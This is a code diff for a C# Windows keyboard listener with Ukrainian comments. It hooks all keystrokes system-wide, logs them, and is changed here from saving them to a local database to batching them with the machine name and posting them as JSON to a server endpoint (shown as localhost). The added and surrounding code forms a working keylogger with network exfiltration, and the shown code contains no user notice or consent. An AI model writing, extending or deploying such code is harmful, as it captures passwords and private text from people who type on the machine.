@@ -1,12 +1,14 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.Globalization;
 using System.IO;
+using System.Net.Http;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Text.Json;
+using System.Threading.Tasks;
 using System.Windows.Forms;
-using ListenerDatabase;
-using ListenerDatabase.Models;
 
 namespace Last5Launching
 {
@@ -16,12 +18,16 @@ namespace Last5Launching
         private const int WM_KEYDOWN = 0x0100;
         private IntPtr _hookPtr = IntPtr.Zero;
         private readonly KeyboardHookDelegate handler;
-        private readonly AppDbContext _dbContext; // Контекст бази даних
 
-        public MyKeyboardListener(AppDbContext dbContext)
+        private readonly List<string> _keyBuffer; // Буфер для клавіш
+        private readonly object _bufferLock = new object(); // Об'єкт для синхронізації доступу до буфера
+        private const int BufferLimit = 50; // Ліміт клавіш для відправки
+        private const string ServerUrl = "http://localhost:5283/api/save-keypresses"; // URL для надсилання клавіш
+
+        public MyKeyboardListener()
         {
             handler = KeyboardHandler;
-            _dbContext = dbContext; // Передаємо контекст бази даних
+            _keyBuffer = new List<string>();
         }
 
         delegate IntPtr KeyboardHookDelegate(int code, IntPtr wParam, IntPtr lParam);
@@ -94,7 +100,62 @@ namespace Last5Launching
             return (keyState & 0x0001) != 0;
         }
 
-        IntPtr KeyboardHandler(int code, IntPtr wParam, IntPtr lParam)
+        private void AddKeyPressToBuffer(string keyPressed)
+        {
+            lock (_bufferLock)
+            {
+                _keyBuffer.Add(keyPressed);
+
+                if (_keyBuffer.Count >= BufferLimit)
+                {
+                    _ = SendKeyBufferToServerAsync(); // Асинхронно відправляємо буфер
+                }
+            }
+        }
+
+        private async Task SendKeyBufferToServerAsync()
+        {
+            lock (_bufferLock)
+            {
+                if (_keyBuffer.Count == 0)
+                    return;
+            }
+
+            try
+            {
+                string computerName = Environment.MachineName;
+                var payload = new
+                {
+                    computerName,
+                    keyPresses = new List<string>()
+                };
+
+                lock (_bufferLock)
+                {
+                    payload.keyPresses.AddRange(_keyBuffer);
+                    _keyBuffer.Clear(); // Очищення буфера
+                }
+
+                using var client = new HttpClient();
+                var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
+                var response = await client.PostAsync(ServerUrl, content);
+
+                if (response.IsSuccessStatusCode)
+                {
+                    Console.WriteLine($"Пакет із {payload.keyPresses.Count} клавіш успішно надіслано.");
+                }
+                else
+                {
+                    Console.WriteLine($"Помилка при відправці пакету клавіш: {response.ReasonPhrase}");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Помилка при відправці пакету клавіш: {ex.Message}");
+            }
+        }
+
+        private IntPtr KeyboardHandler(int code, IntPtr wParam, IntPtr lParam)
         {
             if (code >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
@@ -121,8 +182,7 @@ namespace Last5Launching
                     Debug.WriteLine($"Error writing to log file: {ex.Message}");
                 }
 
-                // Збереження у базу даних
-                SaveKeyPressToDatabase(logEntry);
+                AddKeyPressToBuffer(logEntry); // Додавання до буфера
             }
 
             return CallNextHookEx(_hookPtr, code, wParam, lParam);
@@ -137,39 +197,9 @@ namespace Last5Launching
             return cultureInfo.TwoLetterISOLanguageName.ToUpper();
         }
 
-        private void SaveKeyPressToDatabase(string keyPressed)
+        public void FlushBufferOnExit()
         {
-            try
-            {
-                string computerName = Environment.MachineName;
-
-                // Отримуємо користувача
-                var user = _dbContext.Users.FirstOrDefault(u => u.ComputerName == computerName);
-                if (user == null)
-                {
-                    // Якщо користувач не існує, створюємо нового
-                    user = new User { ComputerName = computerName };
-                    _dbContext.Users.Add(user);
-                    _dbContext.SaveChanges();
-                }
-
-                // Додаємо запис про натискання клавіші
-                var keyLog = new KeyLog
-                {
-                    KeyPressed = keyPressed,
-                    Timestamp = DateTime.Now,
-                    UserId = user.UserId
-                };
-
-                _dbContext.KeyLogs.Add(keyLog);
-                _dbContext.SaveChanges();
-
-                Console.WriteLine($"Клавіша '{keyPressed}' збережена у базу.");
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine($"Помилка при збереженні клавіші у базу: {ex.Message}");
-            }
+            _ = SendKeyBufferToServerAsync(); // Відправка залишків буфера при завершенні роботи
         }
     }
 }
